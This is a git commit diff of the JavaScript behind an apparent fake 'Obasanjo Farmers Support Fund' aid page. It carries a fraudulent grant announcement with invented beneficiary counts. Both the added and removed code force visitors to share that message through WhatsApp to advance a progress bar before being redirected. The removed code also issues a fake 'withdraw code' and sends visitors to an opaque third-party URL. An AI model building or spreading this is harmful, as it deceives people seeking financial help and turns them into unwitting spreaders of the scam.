fce99df349f3445cd8d47dfdac0734fc356ee98e
OBASANJO-FARMERS-SUPPORT-FUND <93765349+OBASANJO-FARMERS-SUPPORT-FUND@users.noreply.github.com>
2021-11-30 16:20:06 +0100

    Update final.js

--- final.js
+++ final.js
@@ -1,63 +1,47 @@
-var number = 0;
+
 
             
             j='*OBASANJO FARMERS SUPPORT FUND IS OUT.*%0A%0A*OBASANJO SUPPORT ORGANIZATION(OSO)*%0A%0A is a None Governmental organization which was founded on  July 20th 2020, with Aim to support Nigeria Farmers.*%0A%0A*This Offer Is Available Till 30th December 2021.*.%0A%0A.%0A-So Far, 341407 Nigerians Have Benefited From This Offer. You Can Also Benefit. Apply Now and Follow Instructions.%0A*APPLY HERE*%0A%0Ahttps://obasanjo-farmers-support-fund.github.io/apply/';
             
-            function move() {
-              var elem = document.getElementById("myBar"); 
-              number=number+20;  
+
+let pbar=document.getElementById('barp');
+            let statuper=localStorage.getItem('p');
+            let moved=document.getElementById('move');
+            console.log(moved);
+           
             
+
             
-              if (number == 20) {	
-                  window.open("whatsapp://send?text=" + j);
-                elem.style.width = 20 + '%'; 
-                elem.innerHTML = 20 + '%';
-                number=20
+            if(typeof statuper !==undefined && statuper !=null ){
+                console.log('p is set')
                 
-              }
-            
-              if (number == 40) {
-              window.open("whatsapp://send?text=" + j);
-                elem.style.width = 40 + '%';
-                elem.innerHTML = 40 + '%';
-              }
-            
-              if (number == 60) {
-               window.open("whatsapp://send?text=" + j);
-                elem.style.width = 60 + '%';
-                elem.innerHTML = 60 + '%';
-              }
-            
-             if (number == 80) {
-              window.open("whatsapp://send?text=" + j);
-                elem.style.width = 80 + '%';
-                elem.innerHTML = 80 + '%';
-              }
-            
-              if (number>=100){
+            }else{
+                localStorage.setItem('p', 0);
+                statuper=0;
                 
-               window.open("withdrawcode.html","_self");
-              }
-              
             }
+            
+            pbar.innerHTML=statuper+ '%'
+            pbar.style.width=statuper+'%';
 
 
+            moved.addEventListener('click',move);
 
-            document.getElementById('wd').innerHTML=withdrawcode(5);
-        
-            function withdrawcode(code_lenght){
-              var code='';
-              var chars ='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ12334567890';
-              for(var i,i=0;i<code_lenght;i++){
-                code +=chars.charAt(Math.floor(Math.random()*chars.length));
-              }
-              
-               return code
+            function move(e){
+                statuper=Number(statuper)+20;
+                localStorage.setItem('p', statuper);
+                console.log(statuper);
+                pbar.style.width=statuper+'%';
+                pbar.innerHTML=statuper+ '%'
+                if(statuper>=100){
+                    localStorage.removeItem('p');
+                    window.location.href = 'message.html';
+                }else{
+                    window.open("whatsapp://send?text=" + j);
+                }
+
             }
-
-            function step2(){
-              window.open("//oackoubs.com/4/4594571","_self");
-            }
+            
 
             
 
